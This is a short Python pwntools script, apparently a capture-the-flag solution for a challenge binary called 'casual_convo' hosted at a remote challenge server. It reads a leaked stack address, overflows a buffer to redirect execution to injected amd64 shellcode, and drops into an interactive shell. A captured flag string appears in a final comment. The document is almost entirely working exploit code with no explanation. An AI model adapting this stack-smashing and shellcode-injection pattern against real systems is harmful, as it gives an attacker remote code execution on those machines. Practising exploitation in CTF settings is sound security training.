from pwn import *
context.binary = './casual_convo'
context.log_level = 'debug'

# Add a breakpoint at convo function and then continue
# For Local Test
#r = gdb.debug('./casual_convo','b convo\nc') 
# For Remote Connect
r = remote('chal.firebird.sh', 35023) 
r.recvuntil(b'0x')
rbp_leak = int(r.recv(12),16)

r.recvuntil(b'?\n')

r.sendline(flat({
        24: rbp_leak + 0x10,
        32: asm(shellcraft.amd64.linux.sh())
}))

r.interactive()


#b'flag{m1dt3Rm5_hArD_buT_49o1_eZ}'